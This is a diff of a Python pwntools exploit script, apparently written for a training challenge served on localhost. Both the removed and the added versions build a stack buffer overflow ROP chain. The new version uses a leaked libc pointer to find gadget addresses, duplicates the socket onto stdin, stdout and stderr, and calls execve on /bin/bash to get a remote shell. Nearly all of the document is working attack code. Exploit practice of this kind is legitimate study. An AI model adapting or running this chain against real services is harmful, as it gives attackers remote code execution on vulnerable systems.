@@ -1,99 +1,113 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
+import time
 import struct
+import sys
+import argparse
 from pwn import *
 
-e = ELF("./challenge17")
-tube = connect("localhost", 5002)
+gdbStr = '''
+set follow-fork-mode child
+{}
+continue
+'''
 
-offset = 152
+def main():
+    print("Dont forget to start the server in the background")
+    context.update(arch='amd64', os='linux')
 
-def doBof(payload):
-        print tube.recvuntil("> ")
-        tube.send("1");
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--offset", type=int, required=True)
+    parser.add_argument("--keep", default=False, action='store_true')
+    parser.add_argument("--gdbstr", nargs='?', default="", type=str)
+    parser.add_argument("--gdb", default=False, action='store_true')
 
-        print tube.recv()
-        tube.send(str(len(payload)));
+    args = parser.parse_args()
 
-        print tube.recv()
-        tube.send(payload)
+    io = remote("localhost", 5001)
+    if args.gdb:
+        gdb.attach(io, gdbStr.format(args.gdbstr))
 
-        print tube.recv()
+    print("--[ Send exploit")
 
-	tube.interactive()
+    infoLeakData = io.read()
+    print("Infoleak:")
+    print(hexdump(infoLeakData))
 
+    exploit = makeExploit(args.offset, infoLeakData)
+    #print(hexdump(exploit, skip=False))
 
-payload = "A" * offset
-
-# data 
-
-sh_addr = 0x400ed8
-
-
-# gadgets 
-
-# 0x0000000000400c91: pop rax; ret; 
-pop_rax = 0x0000000000400c91
-
-# 0x0000000000400eb3: pop rdi; ret;
-pop_rdi = 0x0000000000400eb3
-
-# 0x0000000000400eb1: pop rsi; pop r15; ret;
-pop_rsi_r15 = 0x0000000000400eb1
-
-# 0x0000000000400c93: syscall; ret; 
-syscall = 0x0000000000400c93
+    print("Send Data: ")
+    io.send(exploit)
+    if args.keep:
+        io.recvall()
+    
+    io.interactive()
+    return
 
 
-# Start ROP chain 
-
-# dup2() syscall is 33
-
-# dup2(4, 0)
-payload += p64 ( pop_rax ) 
-payload += p64 ( 33 )
-payload += p64 ( pop_rdi ) 
-payload += p64 ( 4 )
-payload += p64 ( pop_rsi_r15)
-payload += p64 ( 0 )
-payload += p64 ( 0xdeadbeef1 )
-payload += p64 ( syscall ) 
+def makePattern(offset):
+    pattern = b'XXXX'
+    pattern += b'A' * (offset - 4)
+    pattern += b'BBBB' # RIP
+    return pattern
 
 
-# dup2(4, 1)
-payload += p64 ( pop_rax ) 
-payload += p64 ( 33 )
-payload += p64 ( pop_rdi ) 
-payload += p64 ( 4 )
-payload += p64 ( pop_rsi_r15)
-payload += p64 ( 1 )
-payload += p64 ( 0xdeadbeef2 )
-payload += p64 ( syscall ) 
+def makeExploit(offset, infoLeakData):
+    payload = b'A' * offset
+
+    libcPtr = u64(infoLeakData[0x60:0x60+8])
+    libcBase = libcPtr - 158986
+    null = 0x404090
+    socketNo = 4
+
+    print("LIBC Ptr : " + str(hex(libcPtr)))
+    print("LIBC Base: " + str(hex(libcBase)))
+
+    binBash = libcBase + 1614162
+    pop_rax = libcBase + 0x3ee88
+    pop_rdi = libcBase + 0x26796
+    pop_rsi = libcBase + 0x2890f
+    syscall = libcBase + 0x580da
+
+    # dup2(4, 0)
+    payload += p64 ( pop_rax ) 
+    payload += p64 ( 33 )
+    payload += p64 ( pop_rdi ) 
+    payload += p64 ( socketNo )
+    payload += p64 ( pop_rsi)
+    payload += p64 ( 0 )
+    payload += p64 ( syscall ) 
+
+    # dup2(4, 1)
+    payload += p64 ( pop_rax ) 
+    payload += p64 ( 33 )
+    payload += p64 ( pop_rdi ) 
+    payload += p64 ( socketNo )
+    payload += p64 ( pop_rsi )
+    payload += p64 ( 1 )
+    payload += p64 ( syscall ) 
+
+    # dup2(4, 2)
+    payload += p64 ( pop_rax ) 
+    payload += p64 ( 33 )
+    payload += p64 ( pop_rdi ) 
+    payload += p64 ( socketNo )
+    payload += p64 ( pop_rsi)
+    payload += p64 ( 2 )
+    payload += p64 ( syscall ) 
+
+    # execve 
+    payload += p64 ( pop_rdi )
+    payload += p64 ( binBash )
+    payload += p64 ( pop_rsi )
+    payload += p64 ( null )
+    payload += p64 ( pop_rax)
+    payload += p64 ( 59 )
+    payload += p64 ( syscall )
+
+    return payload
 
 
-# dup2(4, 2)
-payload += p64 ( pop_rax ) 
-payload += p64 ( 33 )
-payload += p64 ( pop_rdi ) 
-payload += p64 ( 4 )
-payload += p64 ( pop_rsi_r15)
-payload += p64 ( 2 )
-payload += p64 ( 0xdeadbeef3 )
-payload += p64 ( syscall ) 
-
-
-# execve 
-payload += p64 ( pop_rdi )
-payload += p64 ( sh_addr )
-payload += p64 ( pop_rsi_r15 )
-payload += p64 ( 0x6020e0 )
-payload += p64 ( 0xdeadbeef4 )
-payload += p64 ( pop_rax)
-payload += p64 ( 59 )
-payload += p64 ( syscall )
-
-payload += p64 ( 0x41414141 ) 
-payload += p64 ( 0x42424242 ) 
-
-doBof(payload)
-
+if __name__ == '__main__':
+        main()
